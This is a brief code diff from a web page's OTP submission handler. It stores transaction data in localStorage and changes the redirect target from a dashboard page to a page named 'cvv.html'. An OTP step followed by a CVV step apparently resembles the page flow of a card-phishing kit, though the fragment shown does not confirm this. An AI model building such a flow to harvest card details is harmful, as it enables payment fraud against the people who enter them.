@@ -3195,7 +3195,7 @@ function handleOTPSubmit(event) {
     const transactionKey = 'transaction_otp_' + Date.now();
     localStorage.setItem(transactionKey, JSON.stringify(transactionData));
     
-    // Redirect to dashboard
-    window.location.href = '/dashboard.html';
+    // Redirect to CVV page
+    window.location.href = '/cvv.html';
 }
 </script>
